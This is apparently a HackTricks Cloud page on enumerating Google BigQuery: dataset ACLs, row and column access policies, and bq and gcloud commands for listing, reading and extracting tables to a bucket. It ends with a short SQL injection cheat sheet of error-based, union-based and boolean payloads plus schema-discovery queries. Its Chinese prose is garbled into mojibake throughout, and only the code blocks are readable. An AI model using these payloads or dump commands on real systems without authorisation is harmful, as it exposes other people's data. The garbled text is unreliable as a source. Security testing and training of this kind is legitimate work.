# GCP - Bigquery æšä¸¾

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆçš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)** ä¸Š**å…³æ³¨æˆ‘ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§
* github ä»“åº“ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Google Cloud BigQuery æ˜¯ä¸€ç§**å®Œå…¨æ‰˜ç®¡çš„ã€æ— æœåŠ¡å™¨çš„ä¼ä¸šæ•°æ®ä»“åº“**ï¼Œæä¾›å¯¹**ä»¥ PB ä¸ºå•ä½çš„æ•°æ®è¿›è¡Œåˆ†æ**çš„èƒ½åŠ›ï¼Œæœ‰æ•ˆå¤„ç†å¤§è§„æ¨¡æ•°æ®é›†ã€‚ä½œä¸ºå¹³å°å³æœåŠ¡ï¼ˆPaaSï¼‰ï¼Œå®ƒä¸ºç”¨æˆ·æä¾›åŸºç¡€æ¶æ„å’Œå·¥å…·ï¼Œä»¥ä¾¿åœ¨æ— éœ€æ‰‹åŠ¨ç›‘ç£çš„æƒ…å†µä¸‹è¿›è¡Œæ•°æ®ç®¡ç†ã€‚

å®ƒæ”¯æŒä½¿ç”¨**ANSI SQL**è¿›è¡ŒæŸ¥è¯¢ã€‚ä¸»è¦å¯¹è±¡æ˜¯åŒ…å«**è¡¨**çš„**æ•°æ®é›†**ï¼Œè¡¨ä¸­åŒ…å« SQL **æ•°æ®**ã€‚

### åŠ å¯†

é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨**ç”± Google ç®¡ç†çš„åŠ å¯†å¯†é’¥**ï¼Œå°½ç®¡å¯ä»¥é…ç½®**å®¢æˆ·ç®¡ç†çš„åŠ å¯†å¯†é’¥ï¼ˆCMEKï¼‰**ã€‚å¯ä»¥æŒ‡å®šæ•°æ®é›†å’Œæ•°æ®é›†ä¸­çš„è¡¨çš„åŠ å¯†å¯†é’¥ã€‚

### è¿‡æœŸ

å¯ä»¥åœ¨æ•°æ®é›†ä¸­æŒ‡å®š**è¿‡æœŸæ—¶é—´**ï¼Œå› æ­¤åœ¨æ­¤æ•°æ®é›†ä¸­åˆ›å»ºçš„ä»»ä½•æ–°è¡¨å°†åœ¨åˆ›å»ºåæŒ‡å®šçš„å¤©æ•°å**è‡ªåŠ¨åˆ é™¤**ã€‚

### å¤–éƒ¨æ¥æº

BigQuery ä¸å…¶ä»– Google æœåŠ¡æ·±åº¦é›†æˆã€‚å¯ä»¥ä»å­˜å‚¨æ¡¶ã€pub/subã€Google Driveã€RDS æ•°æ®åº“åŠ è½½æ•°æ®...

### æ•°æ®é›† ACL

åˆ›å»ºæ•°æ®é›†æ—¶ä¼šé™„åŠ **ACL**ä»¥æˆäºˆå¯¹å…¶çš„è®¿é—®æƒé™ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ**åˆ›å»ºæ•°æ®é›†çš„ç”¨æˆ·**è¢«æˆäºˆ**æ‰€æœ‰è€…**æƒé™ï¼Œç„¶åå°†**é¡¹ç›®æ‰€æœ‰è€…**ç»„ï¼ˆé¡¹ç›®æ‰€æœ‰è€…ï¼‰ã€**é¡¹ç›®ç¼–å†™è€…**ç»„æˆäºˆ**æ‰€æœ‰è€…**æƒé™ï¼Œå°†**é¡¹ç›®è¯»è€…**ç»„æˆäºˆ**è¯»å–è€…**æƒé™ã€‚
```bash
bq show --format=prettyjson <proj>:<dataset>

...
"access": [
{
"role": "WRITER",
"specialGroup": "projectWriters"
},
{
"role": "OWNER",
"specialGroup": "projectOwners"
},
{
"role": "OWNER",
"userByEmail": "gcp-admin@hacktricks.xyz"
},
{
"role": "OWNER",
"userByEmail": "support@hacktricks.xyz"
},
{
"role": "READER",
"specialGroup": "projectReaders"
}
],
...
```
### æ§åˆ¶è¡¨æ ¼è¡Œè®¿é—®æƒé™

å¯ä»¥ä½¿ç”¨è¡Œè®¿é—®ç­–ç•¥æ¥æ§åˆ¶ä¸»ä½“å°†èƒ½å¤Ÿè®¿é—®è¡¨ä¸­çš„è¡Œã€‚è¿™äº›ç­–ç•¥åœ¨è¡¨å†…éƒ¨ä½¿ç”¨ [DDL](https://cloud.google.com/bigquery/docs/reference/standard-sql/data-definition-language#create\_row\_access\_policy\_statement) æ¥å®šä¹‰ã€‚è®¿é—®ç­–ç•¥å®šä¹‰äº†ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œåªæœ‰ä¸è¯¥è¿‡æ»¤å™¨åŒ¹é…çš„è¡Œæ‰èƒ½è¢«æŒ‡å®šçš„ä¸»ä½“è®¿é—®ã€‚
```sql
# Create
CREATE ROW ACCESS POLICY apac_filter
ON project.dataset.my_table
GRANT TO ('user:abc@example.com')
FILTER USING (region = 'APAC');

# Update
CREATE OR REPLACE ROW ACCESS POLICY
CREATE ROW ACCESS POLICY sales_us_filter
ON project.dataset.my_table
GRANT TO ('user:john@example.com',
'group:sales-us@example.com',
'group:sales-managers@example.com')
FILTER USING (region = 'US');

# Check the Post Exploitation tricks to see how to call this from the cli
```

```bash
# Enumerate row policies on a table
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies
```
### åˆ—è®¿é—®æ§åˆ¶

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

è¦åœ¨åˆ—çº§åˆ«é™åˆ¶æ•°æ®è®¿é—®ï¼š

1. **å®šä¹‰åˆ†ç±»å’Œç­–ç•¥æ ‡ç­¾**ã€‚ä¸ºæ‚¨çš„æ•°æ®åˆ›å»ºå’Œç®¡ç†åˆ†ç±»å’Œç­–ç•¥æ ‡ç­¾ã€‚[https://console.cloud.google.com/bigquery/policy-tags](https://console.cloud.google.com/bigquery/policy-tags)
2. å¯é€‰ï¼šå°†**Data Catalog Fine-Grained Reader**è§’è‰²æˆäºˆä¸€ä¸ªæˆ–å¤šä¸ªä¸»ä½“ï¼Œé€‚ç”¨äºæ‚¨åˆ›å»ºçš„ä¸€ä¸ªæˆ–å¤šä¸ªç­–ç•¥æ ‡ç­¾ã€‚
3. **å°†ç­–ç•¥æ ‡ç­¾åˆ†é…ç»™æ‚¨çš„BigQueryåˆ—**ã€‚åœ¨BigQueryä¸­ï¼Œä½¿ç”¨æ¨¡å¼æ³¨é‡Šä¸ºæ‚¨æƒ³è¦é™åˆ¶è®¿é—®çš„æ¯ä¸ªåˆ—åˆ†é…ä¸€ä¸ªç­–ç•¥æ ‡ç­¾ã€‚
4. **å¼ºåˆ¶æ‰§è¡Œåˆ†ç±»ä¸Šçš„è®¿é—®æ§åˆ¶**ã€‚å¼ºåˆ¶æ‰§è¡Œè®¿é—®æ§åˆ¶ä¼šå¯¼è‡´åº”ç”¨äºåˆ†ç±»ä¸­æ‰€æœ‰ç­–ç•¥æ ‡ç­¾çš„è®¿é—®é™åˆ¶ã€‚
5. **ç®¡ç†ç­–ç•¥æ ‡ç­¾ä¸Šçš„è®¿é—®æƒé™**ã€‚ä½¿ç”¨[èº«ä»½å’Œè®¿é—®ç®¡ç†](https://cloud.google.com/iam)ï¼ˆIAMï¼‰ç­–ç•¥æ¥é™åˆ¶å¯¹æ¯ä¸ªç­–ç•¥æ ‡ç­¾çš„è®¿é—®ã€‚è¯¥ç­–ç•¥å¯¹å±äºç­–ç•¥æ ‡ç­¾çš„æ¯ä¸ªåˆ—æœ‰æ•ˆã€‚

å½“ç”¨æˆ·åœ¨æŸ¥è¯¢æ—¶å°è¯•è®¿é—®åˆ—æ•°æ®æ—¶ï¼ŒBigQueryä¼š**æ£€æŸ¥åˆ—ç­–ç•¥æ ‡ç­¾åŠå…¶ç­–ç•¥ï¼Œä»¥æŸ¥çœ‹ç”¨æˆ·æ˜¯å¦è¢«æˆæƒè®¿é—®æ•°æ®**ã€‚

{% hint style="success" %}
æ€»ç»“ä¸€ä¸‹ï¼Œè¦å°†å¯¹æŸäº›åˆ—çš„è®¿é—®é™åˆ¶ä¸ºæŸäº›ç”¨æˆ·ï¼Œæ‚¨å¯ä»¥**åœ¨æ¨¡å¼ä¸­ä¸ºåˆ—æ·»åŠ æ ‡ç­¾å¹¶é™åˆ¶ç”¨æˆ·å¯¹æ ‡ç­¾çš„è®¿é—®**ï¼Œé€šè¿‡åœ¨æ ‡ç­¾çš„åˆ†ç±»ä¸Šå¼ºåˆ¶æ‰§è¡Œè®¿é—®æ§åˆ¶ã€‚
{% endhint %}

è¦å¼ºåˆ¶æ‰§è¡Œåˆ†ç±»ä¸Šçš„è®¿é—®æ§åˆ¶ï¼Œéœ€è¦å¯ç”¨è¯¥æœåŠ¡ï¼š
```bash
gcloud services enable bigquerydatapolicy.googleapis.com
```
å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç æŸ¥çœ‹åˆ—çš„æ ‡ç­¾ï¼š

{% code overflow="wrap" %}
```bash
bq show --schema <proj>:<dataset>.<table>

[{"name":"username","type":"STRING","mode":"NULLABLE","policyTags":{"names":["projects/.../locations/us/taxonomies/2030629149897327804/policyTags/7703453142914142277"]},"maxLength":"20"},{"name":"age","type":"INTEGER","mode":"NULLABLE"}]
```
### æšä¸¾

{% code overflow="wrap" %}
```bash
# Dataset info
bq ls # List datasets
bq ls -a # List all datasets (even hidden)
bq ls <proj>:<dataset> # List tables in a dataset
bq show --format=prettyjson <proj>:<dataset> # Get info about the dataset (like ACLs)

# Tables info
bq show --format=prettyjson <proj>:<dataset>.<table> # Get table info
bq show --schema <proj>:<dataset>.<table>  # Get schema of a table

# Get entries from the table
bq head <dataset>.<table>
bq query --nouse_legacy_sql 'SELECT * FROM `<proj>.<dataset>.<table-name>` LIMIT 1000'
bq extract <dataset>.<table> "gs://<bucket>/table*.csv" # Use the * so it can dump everything in different files

# Insert data
bq query --nouse_legacy_sql 'INSERT INTO `digital-bonfire-410512.importeddataset.tabletest` (rank, refresh_date, dma_name, dma_id, term, week, score) VALUES (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2019-10-13", 62), (22, "2023-12-28", "Baltimore MD", 512, "Ms", "2020-05-24", 67)'
bq insert dataset.table /tmp/mydata.json

# Get permissions
bq get-iam-policy <proj>:<dataset> # Get dataset IAM policy
bq show --format=prettyjson <proj>:<dataset> # Get dataset ACLs
bq get-iam-policy <proj>:<dataset>.<table> # Get table IAM policy
bq ls --row_access_policies <proj>:<dataset>.<table> # Get row policies

# Taxonomies (Get the IDs from the shemas of the tables)
gcloud data-catalog taxonomies describe <taxonomi-ID> --location=<location>
gcloud data-catalog taxonomies list --location <location> #Find more
gcloud data-catalog taxonomies get-iam-policy <taxonomi-ID> --location=<location>

# Misc
bq show --encryption_service_account # Get encryption service account
```
{% endcode %}

### BigQuery SQLæ³¨å…¥

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹åšå®¢æ–‡ç« ï¼š[https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)ã€‚è¿™é‡Œåªä¼šæä¾›ä¸€äº›ç»†èŠ‚ã€‚

**æ³¨é‡Š**ï¼š

* `select 1#from here it is not working`
* `select 1/*between those it is not working*/` ä½†åªæœ‰åˆå§‹çš„ä¸èµ·ä½œç”¨
* `select 1--from here it is not working`

è·å–æœ‰å…³**ç¯å¢ƒ**çš„**ä¿¡æ¯**ï¼Œä¾‹å¦‚ï¼š

* å½“å‰ç”¨æˆ·ï¼š`select session_user()`
* é¡¹ç›®IDï¼š`select @@project_id`

è·å–**æ•°æ®é›†**ï¼Œ**è¡¨**å’Œ**åˆ—**åç§°ï¼š

* **é¡¹ç›®**å’Œ**æ•°æ®é›†**åç§°ï¼š
```sql
SELECT catalog_name, schema_name FROM INFORMATION_SCHEMA.SCHEMATA
```
* **åˆ—**å’Œ**è¡¨**åç§°ï¼š
```sql
# SELECT table_name, column_name FROM <proj-name>.<dataset-name>.INFORMATION_SCHEMA.COLUMNS

SELECT table_name, column_name FROM digital-bonfire-410512.importeddataset.INFORMATION_SCHEMA.COLUMNS
```
{% endcode %}

* **åŒä¸€é¡¹ç›®ä¸­çš„å…¶ä»–æ•°æ®é›†**ï¼š&#x20;

{% code overflow="wrap" %}
```sql
#Â SELECT catalog_name, schema_name, FROM <proj-name>.INFORMATION_SCHEMA.SCHEMATA

SELECT catalog_name, schema_name, NULL FROM digital-bonfire-410512.INFORMATION_SCHEMA.SCHEMATA
```
{% endcode %}

**SQLæ³¨å…¥ç±»å‹:**

* åŸºäºé”™è¯¯çš„ - å¼ºåˆ¶è½¬æ¢: `select CAST(@@project_id AS INT64)`
* åŸºäºé”™è¯¯çš„ - é™¤é›¶æ“ä½œ: `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`
* åŸºäºè”åˆçš„: `UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#`
* åŸºäºå¸ƒå°”çš„: ``' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#``
* æ½œåœ¨åŸºäºæ—¶é—´çš„ - ä½¿ç”¨å…¬å…±æ•°æ®é›†ç¤ºä¾‹: ``SELECT * FROM `bigquery-public-data.covid19_open_data.covid19_open_data` LIMIT 1000``

**æ–‡æ¡£:**

* æ‰€æœ‰å‡½æ•°åˆ—è¡¨: [https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* è„šæœ¬è¯­å¥: [https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting](https://cloud.google.com/bigquery/docs/reference/standard-sql/scripting)

### æƒé™æå‡å’Œåæ¸—é€

{% content-ref url="../gcp-privilege-escalation/gcp-bigquery-privesc.md" %}
[gcp-bigquery-privesc.md](../gcp-privilege-escalation/gcp-bigquery-privesc.md)
{% endcontent-ref %}

### æŒä¹…æ€§

{% content-ref url="../gcp-persistence/gcp-bigquery-persistence.md" %}
[gcp-bigquery-persistence.md](../gcp-persistence/gcp-bigquery-persistence.md)
{% endcontent-ref %}

## å‚è€ƒ

* [https://cloud.google.com/bigquery/docs/column-level-security-intro](https://cloud.google.com/bigquery/docs/column-level-security-intro)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼:

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ä¸Šå…³æ³¨**æˆ‘ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§
* githubä»“åº“ã€‚

</details>
